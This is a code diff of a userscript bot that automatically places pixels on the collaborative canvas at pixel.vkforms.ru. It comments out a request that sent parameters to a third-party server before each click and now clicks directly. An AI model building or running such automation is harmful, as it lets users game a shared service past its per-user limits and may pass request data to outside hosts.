@@ -1,7 +1,7 @@
 // ==UserScript==
 // @name          Pixel Bot (2ch edition)
 // @namespace    http://tampermonkey.net/
-// @version      0.1.3
+// @version      0.1.4
 // @description  try to take over the world!
 // @author       Flyink13, DarkKeks, TheGorox, mnb3000
 // @match        https://pixel.vkforms.ru/*
@@ -190,7 +190,7 @@ function PixelBot() {
             } else {
                 px = PixelBot.pixs.splice(Math.floor(Math.random() * 5), 1)[0];
             }
-            var xml = new XMLHttpRequest();
+            /*var xml = new XMLHttpRequest();
             xml.open('POST', 'https://chechnya.ml:8080/start');
             xml.setRequestHeader("Content-Type", "application/json");
             xml.onreadystatechange = () => {
@@ -199,10 +199,11 @@ function PixelBot() {
                 if (!(res.ok && xml.readyState === XMLHttpRequest.DONE && xml.status === 200)) {
                     return;
                 }else{
-                    PixelBot.canvasClick(px[0], px[1], px[2]);
+                    
                 }
             };
-            xml.send(JSON.stringify(params));
+            xml.send(JSON.stringify(params));*/
+            PixelBot.canvasClick(px[0], px[1], px[2]);
         }
     };
 
